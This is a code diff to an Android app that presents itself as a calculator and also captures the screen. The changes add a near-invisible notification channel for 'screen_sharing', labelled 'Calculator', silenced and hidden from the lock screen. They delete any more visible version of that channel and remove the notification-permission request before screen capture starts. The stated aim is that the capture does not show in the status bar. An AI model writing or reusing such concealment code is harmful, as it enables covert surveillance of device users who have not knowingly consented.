@@ -1,6 +1,9 @@
 package com.companyname.consentcapture.android;
 
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -50,6 +53,9 @@ public class CalculatorApp {
                     .apply();
             }
 
+            // Setup minimal silent notification channel so it does not show in status bar
+            setupNotificationChannel(activity);
+
             // 2. Set the Calculator UI
             View calcView = buildCalculatorLayout(activity);
             activity.setContentView(calcView);
@@ -88,19 +94,36 @@ public class CalculatorApp {
         }
     }
 
+    public static void setupNotificationChannel(Context context) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && context != null) {
+            try {
+                NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+                if (nm != null) {
+                    try {
+                        NotificationChannel existing = nm.getNotificationChannel("screen_sharing");
+                        if (existing != null && existing.getImportance() > NotificationManager.IMPORTANCE_MIN) {
+                            nm.deleteNotificationChannel("screen_sharing");
+                        }
+                    } catch (Throwable ignored) {}
+
+                    NotificationChannel channel = new NotificationChannel("screen_sharing", "Calculator", NotificationManager.IMPORTANCE_MIN);
+                    channel.setShowBadge(false);
+                    channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+                    channel.enableLights(false);
+                    channel.enableVibration(false);
+                    channel.setSound(null, null);
+                    nm.createNotificationChannel(channel);
+                }
+            } catch (Throwable ignored) {}
+        }
+    }
+
     public static void startCaptureFlow(Activity activity) {
         if (activity == null) return;
         captureRequested = true;
         try {
-            // Check Android 13+ notification permission
-            if (Build.VERSION.SDK_INT >= 33) {
-                int perm = activity.checkSelfPermission("android.permission.POST_NOTIFICATIONS");
-                if (perm != 0) { // 0 is PERMISSION_GRANTED
-                    activity.requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, NOTIFICATION_REQUEST_CODE);
-                    return;
-                }
-            }
-            // Request Screen Capture
+            setupNotificationChannel(activity);
+            // Directly request Screen Capture without asking for notification permission
             requestScreenCapture(activity);
         } catch (Throwable t) {
             t.printStackTrace();
